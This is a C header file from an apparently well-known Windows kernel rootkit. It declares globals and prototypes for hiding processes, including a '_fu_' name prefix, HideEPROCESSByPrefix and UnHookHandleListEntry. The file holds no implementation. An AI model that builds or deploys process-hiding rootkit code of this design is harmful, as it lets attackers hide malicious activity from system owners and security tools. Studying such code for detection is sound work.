///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.h
// 
// Author: fuzen
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Defines globals, function prototypes, etc. used by rootkit.c.
//
// Date:    1/1/2005
// Version: 2.0

//////////////////////////////////////////////////////////////////////
// Force everything into the data section. 
/////////////////////////////////////////////////////////////////////
#pragma data_seg(".data")

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

char g_sysName[] = "System";
char g_hide[] = "_fu_";
WCHAR g_strCSDVersion[] = L"CSDVersion"; 
WCHAR g_strCurrentVersion[] = L"CurrentVersion"; 

NTSTATUS WorkerThread(IN PVOID);
NTSTATUS SetupGlobalsByOS(PDWORD, PDWORD, PDWORD);
NTSTATUS RootkitUnload(IN PDRIVER_OBJECT);
void UnHookHandleListEntry(PEPROCESS, DWORD, DWORD);
void HideEPROCESSByPrefix(char *, DWORD, DWORD, DWORD, DWORD);

// GLOBALS
DWORD      gd_procName;
PETHREAD   gp_Thread;
BOOLEAN    gb_threadStop;